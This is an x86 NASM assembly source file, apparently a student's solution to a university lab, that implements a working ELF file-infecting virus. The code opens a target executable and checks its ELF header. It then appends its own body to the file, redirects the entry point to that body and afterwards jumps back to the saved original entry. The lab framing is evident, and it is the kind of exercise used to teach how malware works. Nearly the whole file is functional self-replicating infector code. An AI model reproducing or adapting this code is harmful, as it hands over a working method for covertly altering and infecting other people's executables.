%macro	syscall1 2
	mov	ebx, %2
	mov	eax, %1
	int	0x80
%endmacro

%macro	syscall3 4
	mov	edx, %4
	mov	ecx, %3
	mov	ebx, %2
	mov	eax, %1
	int	0x80
%endmacro

%macro  exit 1
	syscall1 1, %1
%endmacro

%macro  write 3
	syscall3 4, %1, %2, %3
%endmacro

%macro  read 3
	syscall3 3, %1, %2, %3
%endmacro

%macro  open 3
	syscall3 5, %1, %2, %3
%endmacro

%macro  lseek 3
	syscall3 19, %1, %2, %3
%endmacro

%macro  close 1
	syscall1 6, %1
%endmacro

%define	STK_RES	200
%define	RDWR	2
%define	SEEK_END 2
%define SEEK_SET 0

%define ENTRY		24
%define PHDR_start	28
%define	PHDR_size	32
%define PHDR_memsize	20	
%define PHDR_filesize	16
%define	PHDR_offset	4
%define	PHDR_vaddr	8
%define vaddr		0x08048000

	global _start

	section .text

_start:	push	ebp
	mov	ebp, esp
	sub	esp, STK_RES            ; Set up ebp and reserve space on the stack for local storage


; You code for this lab goes here
	call	get_my_loc
	sub 	edx, next_i-Virusstr
	mov	ecx, edx
	write 	1, ecx, 16
	call	get_my_loc
	sub	edx,next_i-FileName
	mov	eax, edx
	open	eax, RDWR, 0777
	cmp	eax, 0
	jb	Error
	push	eax
	mov	esi, ebp
	sub	esi, STK_RES
	add	esi, 4
	read	eax, esi,52
	mov	esi, ebp
	sub	esi, STK_RES
	add	esi, 4
	cmp	byte[esi], 0x7f
	jne	Error
	inc 	esi
	cmp	byte[esi], 0x45
	jne 	Error
	inc 	esi
	cmp	byte[esi], 0x4c
	jne	Error
	inc	esi
	cmp 	byte[esi], 0x46
	jne	Error
	inc	esi
	cmp	byte[esi], 0x1
	jne	Error
	;we have ELF32 file, ELF32Hdr is in the stack.
	pop	eax	;eax=fd
	push	eax
	lseek	eax, 0, SEEK_END
	add	eax, vaddr
	mov	esi, ebp
	sub	esi, STK_RES
	add	esi, 4
	add	esi, 24
	mov	ebx, [esi]
	add	esi, 28
	mov	dword[esi],ebx
	sub	esi, 28
	mov	dword[esi], eax	;Entry Point changed in the stack
	pop	eax
	push	eax
	lseek	eax, 0, SEEK_SET
	pop	eax		;pointing to the start of the file
	push	eax
	mov	esi, ebp
	sub	esi, STK_RES
	add	esi, 4	
	write	eax, esi, 52	;copy back the ELF32Hdr
	pop	eax
	push	eax
	lseek	eax, 0, SEEK_END	;code for copying the virus
	pop	eax		;pointing to the end of the file
	call	get_my_loc
	sub	edx,next_i-_start
	mov	ebx, edx
	call	get_my_loc
	sub	edx, next_i - virus_end
	mov	ecx, edx
	sub	ecx, ebx
	push	eax
	write	eax, ebx, ecx
	pop	eax
	push 	eax
	lseek	eax, 0, SEEK_END
	sub	eax, 4
	mov	ebx, eax
	pop	eax
	push	eax
	lseek	eax, ebx, SEEK_SET
	pop	eax
	push	eax
	mov	esi, ebp
	sub	esi, STK_RES
	add	esi, 4
	add	esi, 52
	write	eax, esi, 4
	pop	eax
	close	eax
	mov	edx, 0
	call 	get_my_loc
	sub 	edx, next_i-PreviousEntryPoint
	jmp 	[edx]
	
VirusExit:
       exit 0            ; Termination if all is OK and no previous code to jump to
                         ; (also an example for use of above macros)
Error:
    call 	get_my_loc
    sub 	edx, next_i-PreviousEntryPoint
    jmp 	[edx]
	
FileName:	db "ELFexec", 0
OutStr:		db "The lab 9 proto-virus strikes!", 10, 0
Failstr:        db "perhaps not", 10 , 0
Virusstr:	db "This is a virus ", 10,0
get_my_loc:
	call next_i
next_i:
	pop	edx
	ret	
PreviousEntryPoint: dd VirusExit
virus_end:


